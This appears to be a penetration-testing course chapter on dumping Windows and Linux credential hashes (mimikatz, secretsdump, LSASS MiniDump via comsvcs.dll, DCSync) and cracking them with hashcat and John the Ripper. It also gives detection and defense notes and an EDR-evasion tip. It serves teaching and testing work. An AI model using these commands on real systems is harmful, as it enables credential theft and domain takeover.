---
title: "10. Attacking Password Hashes"
order: 10
part: "Password & Hash Attacks"
description: "Obtaining Windows and Linux hashes, cracking with hashcat and John the Ripper, and rainbow tables."
---

- **(A) OBTAINING the hash (credential access / dumping):** Extracting password representations from the target system's memory, disk, or traffic. This generally requires privilege on the system (SYSTEM/admin/DA).
- **(B) ATTACKING the hash OFFLINE (cracking):** Turning the representation you obtained into a password on your own machine (without stressing the target at all, without lockout/alert risk). This is a matter of CPU/GPU power and wordlist/rules.

Note: Using the hash **without cracking it** (Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash) is a separate discipline; see Section 11. The *obtaining* mechanics of Kerberoasting and AS-REP Roasting belong to Kerberos (see Section 13); here we only give which hashcat/John mode cracks the hashes those attacks produce.

## 10.1 Windows password representations, what are we cracking?

Before attacking, you must know *what* you obtained; wrong identification = wrong cracking mode = wasted hours.

| Representation | Where it is found | Salted? | Cracking speed | Notes |
| --- | --- | --- | --- | --- |
| **LM hash** | SAM, old systems | No | Very fast (weak) | Disabled by default on >=Vista; 14 characters split into 2x7, converted to uppercase, very weak |
| **NT hash (NTLM)** | SAM, NTDS.dit, LSASS | **No (unsalted)** | Very fast | `MD4(UTF-16LE(password))`. Being unsalted makes rainbow tables and PtH possible |
| **NetNTLMv1 / v2** | Network traffic (challenge/response) | Has a challenge | v2 slow | Captured with Responder/relay; it is *not* an NT hash, PtH cannot be done (see 11) |
| **Kerberos TGS (RC4)** | AD service account ticket | No (RC4 derivative) | Medium | Product of Kerberoasting (see 13) |
| **DCC2 (MSCacheV2)** | Domain cached creds (registry) | Yes (username salt) | Very slow | Cache for offline login; found on DC-less hosts |
| **DPAPI-protected secrets** | Browser/RDP/saved credentials | - | Master key required | see 10.7 and Section 11 |

**Why is the NT hash unsalted?** In Windows NTLM authentication the hash acts directly "like the password itself" (the challenge/response input). Because no salt is added, (1) the same password gives the same hash everywhere, (2) a rainbow table is still possible, (3) since hash = password equivalent, Pass-the-Hash works.

## 10.2 Obtaining hashes from Windows, ALL methods

The choice of method depends on privilege and noise tolerance. Below is local -> remote -> DC order.

### 10.2.1 Local SAM/SECURITY (offline, registry hive save)

The LSASS lock prevents reading SAM live; that is why we save the hives to disk and extract them offline. SYSTEM/local admin is required.

```
# On target Windows (cmd/powershell, admin):
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
reg save HKLM\SECURITY security.save
# After copying to Kali, extract offline:
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

Flags: `-sam/-system/-security` the relevant hive files; `LOCAL` means work against local files, not the network. The SYSTEM hive contains the SysKey (boot key), which is mandatory to decrypt the hashes in SAM. The SECURITY hive contains LSA secrets (service account passwords, DPAPI_SYSTEM, cached domain creds).

### 10.2.2 From memory (Meterpreter)

```
# In Meterpreter session (requires SYSTEM):
hashdump                 # LM:NT of local accounts from SAM
load kiwi                # mimikatz's meterpreter extension
creds_all                # all credentials in memory
lsa_dump_sam
lsa_dump_secrets
```

For `hashdump` you must first elevate to SYSTEM with `getsystem`; otherwise "Insufficient privileges".

### 10.2.3 From memory (mimikatz, live LSASS)

```
privilege::debug                 # get SeDebugPrivilege (requires admin)
token::elevate                   # switch to SYSTEM token (for reading SAM/LSA)
sekurlsa::logonpasswords         # Sessions in LSASS: NT hash + (if possible) plaintext + Kerberos keys
lsadump::sam                     # local SAM hashes (decrypts with SysKey)
lsadump::secrets                 # LSA secrets (service passwords, DPAPI_SYSTEM) - decrypts with SysKey
lsadump::cache                   # cached domain logon (DCC2) hashes
```

Concept: `sekurlsa::logonpasswords` reads the credential material of logged-in users in LSASS memory; on old/unpatched systems, if WDigest is enabled, even the **cleartext password** drops. On a modern system (Credential Guard, WDigest disabled) mostly only the NT hash and Kerberos key come out.

### 10.2.4 Remote secretsdump (with admin credentials, DRSUAPI/registry)

```
# With password: SAM + LSA + (if DC) NTDS
impacket-secretsdump DOMAIN/user:pass@10.10.10.10
# With Pass-the-Hash (NT hash instead of password), see Section 11
impacket-secretsdump DOMAIN/user@10.10.10.10 -hashes :<NThash>
# With a Kerberos ticket
impacket-secretsdump -k -no-pass DOMAIN/user@host.corp.local
```

Remote secretsdump by default pulls SAM+SECURITY+SYSTEM with a temporary service/registry process on the target; if it is a DC, it also pulls NTDS via DRSUAPI replication.

### 10.2.5 With netexec (the successor to CrackMapExec)

```
nxc smb 10.10.10.10 -u user -p pass --sam        # local SAM
nxc smb 10.10.10.10 -u user -p pass --lsa        # LSA secrets
nxc smb DC -u da_user -p pass --ntds             # NTDS.dit from DC (DRSUAPI, default)
nxc smb DC -u da_user -H <NThash> --ntds vss     # NTDS via the VSS (shadow copy) method
nxc smb DC -u da_user -p pass --ntds --user krbtgt   # single account only
```

`--ntds vss` creates a Volume Shadow Copy instead of DRSUAPI, copies NTDS.dit + SYSTEM, extracts the hashes, then cleans up the shadow copy. An alternative when DRSUAPI is blocked/monitored.

### 10.2.6 LSASS dump with comsvcs.dll + offline pypykatz

Without dropping mimikatz to disk, take a full memory dump of LSASS with a built-in Windows DLL (LOLBIN); then parse it offline on Kali.

```
# On target (requires SYSTEM). <PID> = lsass.exe PID (tasklist /fi "imagename eq lsass.exe")
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID> C:\Windows\Temp\lsass.dmp full
# Pull the file to Kali, then:
pypykatz lsa minidump lsass.dmp          # NT hash, Kerberos keys, (if present) plaintext
```

Why: the `MiniDump` export of `comsvcs.dll` is a signed, built-in function; the EDR should look not at the mimikatz signature but at behavior (a rundll32 accessing lsass). OPSEC: renaming the DLL can get around command-line signature detection.

### 10.2.7 Domain Controller, all domain hashes (NTDS.dit)

```
# DRSUAPI replication (DA or DCSync right) - cleanest, fastest
impacket-secretsdump DOMAIN/da_user:pass@DC -just-dc            # all NTDS: NT + Kerberos keys
impacket-secretsdump DOMAIN/da_user:pass@DC -just-dc-ntlm       # NT hash ONLY (faster/quieter)
impacket-secretsdump DOMAIN/da_user:pass@DC -just-dc-user krbtgt  # single account (krbtgt)
# VSS alternative (if replication is blocked): shadow copy on DC + copy of NTDS.dit
impacket-secretsdump DOMAIN/da_user:pass@DC -use-vss
# netexec equivalent
nxc smb DC -u da_user -p pass --ntds
# mimikatz DCSync (with any account that has Replication rights, DA not required)
lsadump::dcsync /domain:corp.local /user:corp\krbtgt
lsadump::dcsync /domain:corp.local /all /csv       # all accounts
```

`-just-dc` pulls the NT (and Kerberos AES/DES/RC4) keys of all domain accounts from NTDS.dit. `-just-dc-ntlm` returns only NT hashes: it skips the Kerberos keys, so the output is small and fast. There is no point giving both at once; one or the other. The `krbtgt` NT hash is **required for a Golden Ticket** (see Section 13).

**DCSync logic (why it works):** In AD, domain controllers synchronize data with each other via the `DRSUAPI` (Directory Replication Service) protocol. If an account has the **DS-Replication-Get-Changes** and **DS-Replication-Get-Changes-All** rights, that account tells the DC "I am a DC too, replicate this user's credential data to me"; the DC happily sends the password's hash. The attacker does not read disk, you do not dump LSASS; you simply "speak" the protocol legitimately. That is why DCSync works even with an account that is not a DA but has been granted the replication ACL (misconfigured delegated rights are the classic vector).

**Detection/Defense (hash dumping):**

- **LSASS dump (mimikatz/comsvcs):** Sysmon Event ID **10** (ProcessAccess to lsass.exe, `GrantedAccess` like 0x1010/0x1410), non-built-in processes accessing lsass. Defense: **Credential Guard** (moves LSASS secrets to a VBS/isolated process), **RunAsPPL** (makes LSASS a protected process), keep WDigest disabled.
- **DCSync:** Security event **4662**, in the `Properties` field the replication GUIDs `1131f6aa-...` (Get-Changes) and `1131f6ad-...` (Get-Changes-All), `AccessMask 0x100`, and a subject that is **not a DC computer account**. Defense: directory service auditing must be enabled (otherwise 4662 is never generated), the replication right should belong only to DCs.
- **reg save SAM/SYSTEM:** 4688 (process creation) + command-line auditing; a hive-save anomaly with `reg.exe`.
- **NTDS VSS:** Shadow copy creation (Event 4656/8222, `vssadmin`/WMI traces).

**Note:** `-just-dc` = all NTDS (NT + Kerberos), `-just-dc-ntlm` = NT only. DCSync does **not require DA**, only the Get-Changes/Get-Changes-All ACL is enough. krbtgt NT hash -> Golden Ticket. To decrypt SAM the **SYSTEM hive (SysKey) is mandatory**; SAM on its own is useless.

## 10.3 Obtaining hashes from Linux

If you are root, read `/etc/shadow`, merge it with `/etc/passwd` using `unshadow` (Section 9 reference). The `$id$` prefix in shadow tells the algorithm and determines the correct hashcat/John mode:

| `$id$` prefix | Algorithm | hashcat `-m` | Speed |
| --- | --- | --- | --- |
| `$1$` | md5crypt | 500 | Medium |
| `$5$` | sha256crypt | 7400 | Slow |
| `$6$` | sha512crypt | 1800 | Slow |
| `$2a$`/`$2b$`/`$2y$` | bcrypt | 3200 | Very slow (deliberate) |
| `$y$` | yescrypt | not in hashcat -> John | Very slow |

```
unshadow /etc/passwd /etc/shadow > creds.txt
john creds.txt --wordlist=rockyou.txt
```

Also pull hashes from application DBs: the MySQL `mysql.user` table, WordPress `wp_users` (phpass, `-m 400`), Linux web apps (bcrypt, `-m 3200`).

## 10.4 Cracking with hashcat (FULL)

General syntax: `hashcat -m <mode> -a <attack> <hashfile> [wordlist/mask] [rules]`

### Hash mode table (verified with WebSearch)

| Hash type | `-m` | Source |
| --- | --- | --- |
| LM | 3000 | Old SAM |
| **NTLM (NT hash)** | **1000** | SAM/NTDS/LSASS |
| NetNTLMv1 (+ESS) | 5500 | Responder capture |
| **NetNTLMv2** | **5600** | Responder/relay capture |
| **Kerberoast (TGS-REP, RC4)** | **13100** | see 13 |
| Kerberoast (TGS-REP, AES128/256) | 19600 / 19700 | see 13 |
| **AS-REP Roast** | **18200** | see 13 |
| Kerberos pre-auth (AS-REQ) | 7500 | - |
| md5crypt `$1$` | 500 | Linux |
| sha256crypt `$5$` | 7400 | Linux |
| **sha512crypt `$6$`** | **1800** | Linux shadow |
| **bcrypt `$2*$`** | **3200** | Linux/web |
| DCC1 (MSCache) | 1100 | Cached domain |
| DCC2 (MSCacheV2) | 2100 | Cached domain |
| WPA-PBKDF2 (hccapx) | 22000 | WiFi |
| phpass (WordPress) | 400 | Web |

### Attack modes (`-a`)

| `-a` | Name | What it does |
| --- | --- | --- |
| **0** | Straight (dictionary) | Tries each word in the wordlist; a rule can be added with `-r` |
| **1** | Combinator | Combines two wordlists (each word + each word) |
| **3** | Brute-force / Mask | Produces candidates according to a mask pattern |
| **6** | Hybrid Wordlist + Mask | Dictionary word + mask appended at the end |
| **7** | Hybrid Mask + Wordlist | Mask + dictionary word (mask at the start) |

> Note: `-a 2` (toggle) and `-a 4/5` from old documents do not exist in current hashcat; the modern build uses 0/1/3/6/7.

### Example commands

```
# Plain wordlist (NTLM)
hashcat -m 1000 nt.txt rockyou.txt
# Wordlist + rule
hashcat -m 1000 nt.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# Mask (8 characters: uppercase + 5 lowercase + 2 digits)
hashcat -m 1000 nt.txt -a 3 ?u?l?l?l?l?l?d?d
# Maske + artan uzunluk (1..8)
hashcat -m 1000 nt.txt -a 3 ?a?a?a?a?a?a?a?a --increment --increment-min 1 --increment-max 8
# Combinator (merges two wordlists)
hashcat -m 1000 nt.txt -a 1 words1.txt words2.txt
# Hybrid: wordlist + 3 digits
hashcat -m 1000 nt.txt -a 6 rockyou.txt ?d?d?d
# Custom character set: ?1 = lowercase+digit, then 4 digits
hashcat -m 1000 nt.txt -a 3 -1 ?l?d ?1?1?1?1
# If the hash line has a username (user:hash), strip it
hashcat -m 1000 users_nt.txt rockyou.txt --username
# Show cracked ones (from potfile)
hashcat -m 1000 nt.txt --show
# Performance flags
hashcat -m 1000 nt.txt rockyou.txt -O -w 3
```

### Mask character sets

| Symbol | Set |
| --- | --- |
| `?l` | a-z |
| `?u` | A-Z |
| `?d` | 0-9 |
| `?s` | special characters (!@#...) |
| `?a` | all of ?l?u?d?s |
| `?h` / `?H` | hex (0-9a-f / 0-9A-F) |
| `?b` | 0x00-0xff |

Custom set: `-1 ?l?d` defines one, called with `?1` in the mask. Four custom sets can be defined with `-1/-2/-3/-4`.

### Important flags

| Flag | Meaning |
| --- | --- |
| `-O` | Optimized kernel: much faster but limited password length (generally <=31, varies by mode) |
| `-w 1..4` | Workload profile (1=low/desktop, 3=high, 4=extreme) |
| `--username` | If the hash line has `user:hash` format, separate out the user |
| `--show` | Print previously cracked ones from the potfile |
| `--increment` | Try increasing the mask length from min to max |
| `--potfile-disable` | Do not write to the potfile (forces re-cracking) |
| `--force` | Ignore warnings (for VM/driver issues; often needed in the field) |
| `-r <rule>` | Apply a rule file; **rule stacking** with multiple `-r` |

### Rules

Rules "mangle" dictionary words: prepend/append, flip case, leet-speak (`a->@`), reverse, etc. They imitate people's password-creation habits, which is why a good rule set is more effective than a huge wordlist.

```
hashcat -m 1000 nt.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# Rule stacking (grows multiplicatively, watch out)
hashcat -m 1000 nt.txt rockyou.txt -r best64.rule -r toggles1.rule
```

- `best64.rule`: Balanced, fast, the default first choice.
- `rockyou-30000.rule`, `dive.rule`: More aggressive.
- **OneRuleToRuleThemAll** (community rule, does not ship with hashcat; downloaded separately): ~50k rules in a single file, generally gives the best single-pass coverage/speed balance. (Usage: `-r OneRuleToRuleThemAll.rule`.)

**Potfile:** Hashcat writes every hash it cracks into `~/.local/share/hashcat/hashcat.potfile` (or `--potfile-path`). `--show` reads from here; it does not crack the same hash twice. The reason for "why is nothing showing up" is often that the hash is already in the potfile: check with `--show`.

## 10.5 Cracking with John the Ripper

```
john --format=nt nt.txt --wordlist=rockyou.txt
john --format=sha512crypt shadow.txt --wordlist=rockyou.txt
john shadow.txt --wordlist=rockyou.txt --rules                 # default rule set (Wordlist)
john shadow.txt --wordlist=rockyou.txt --rules=Jumbo           # named rule set
john --incremental shadow.txt                                  # pure brute-force (last resort)
john --incremental=Digits nt.txt                               # digits-only charset
john --show nt.txt                                             # show cracked ones (john.pot)
john --list=formats | grep -i krb                              # search for supported format
```

**Why `--format`?** John usually auto-detects the format, but for distinctions like LM/NT, or when there is a `?` in the output, forcing it with `--format` makes it certain. Cracking strategy (in order): dictionary first -> then dictionary+rules -> mask (if the pattern is known) -> incremental (brute) last. Do not *start* with brute.

### 2john converters (file/ticket -> crackable hash)

The John "Jumbo" version ships with helper tools that extract hashes from various files:

```
zip2john protected.zip > zip.hash       # encrypted ZIP
john zip.hash --wordlist=rockyou.txt
ssh2john id_rsa > ssh.hash              # encrypted SSH private key (password protected)
john ssh.hash --wordlist=rockyou.txt
kirbi2john ticket.kirbi > tgs.hash      # Kerberos .kirbi bileti (Kerberoast)
# Others: rar2john, pdf2john, office2john, keepass2john
```

These hashes can also be given to hashcat (e.g. ZIP -> `-m 13600`, SSH RSA -> `-m 22931`; it varies by mode and must be verified). A common scenario: extracting a captured `.kirbi`/`.zip`/`id_rsa` file with the appropriate `2john` and cracking it.

## 10.6 Rainbow table and performance/cost

- **Rainbow table:** Precomputed hash->password chain tables (e.g. ophcrack, RainbowCrack). Time-memory trade-off: lowers the cracking time at the cost of disk space. **Useless on salted hashes** (each salt invalidates the table); still meaningful for unsalted **LM/NT**. However, since modern GPU brute is fast enough in most cases, the importance of rainbow tables has diminished.
- **Speed/cost logic:** The cracking speed depends entirely on the cost of the hash function. NT/MD5/SHA1 are fast by design (**billions of guesses/sec** on a modern GPU) -> a weak password falls in seconds. bcrypt/sha512crypt/yescrypt are deliberately slow (tuned with a "work factor") -> **thousands/tens of thousands of guesses/sec** on the same hardware, millions of times slower. Therefore:

| Hash | Rough speed (relative) | Strategy |
| --- | --- | --- |
| NT / MD5 / SHA1 | Very high | Large wordlist + heavy rules + mask allowed |
| sha512crypt `$6$` | Low | Targeted small wordlist + best64; mask is expensive |
| bcrypt `$2*$` | Very low | Only the most likely small wordlist; brute practically impossible |

**Decision guide (when which):**

- If you have a GPU and the hash is fast (NT/NetNTLMv2) -> **hashcat** (`-O -w 3`).
- Many formats / exotic files (zip, ssh, pdf) or CPU -> **John Jumbo** + 2john tools.
- If the password pattern is known (e.g. "Company2024!") -> **mask** (`-a 3`) is faster than a wordlist.
- No hints at all + a slow hash -> abandon cracking, consider **Pass-the-Hash/Ticket** (Section 11).

**Detection/Defense (cracking side):** Offline cracking leaves **no trace** on the target (no network/logs), which is why defense focuses on preventing the hash from *being obtained* (Credential Guard, long/random password, LAPS, a strong hash algorithm). For the Blue team the only signal is the event where the hash is *obtained* (see the 10.2 Detection notes).

**Common mistakes:**

- `secretsdump ... -just-dc` pulls all domain hashes from the DC; `-just-dc-ntlm` only NT.
- krbtgt NT hash -> Golden Ticket.
- Choose the right mode: with the wrong `-m` nothing cracks. NTLM=1000, NetNTLMv2=5600, NetNTLMv1=5500, Kerberoast(RC4)=13100, AS-REP=18200, sha512crypt=1800, **bcrypt=3200**, LM=3000.
- `hashcat --show` shows cracked results from the potfile; the main reason for thinking "no results" is that it is already cracked in the potfile.
- NetNTLMv1/v2 is **not an NT hash** -> Pass-the-Hash cannot be done, it is only cracked (or relayed, see 11).
- To decrypt SAM offline the **SYSTEM hive (SysKey) is mandatory**.
- Brute-force is not practical for bcrypt/sha512crypt; the "most efficient method" is a targeted wordlist + rules, not pure brute.
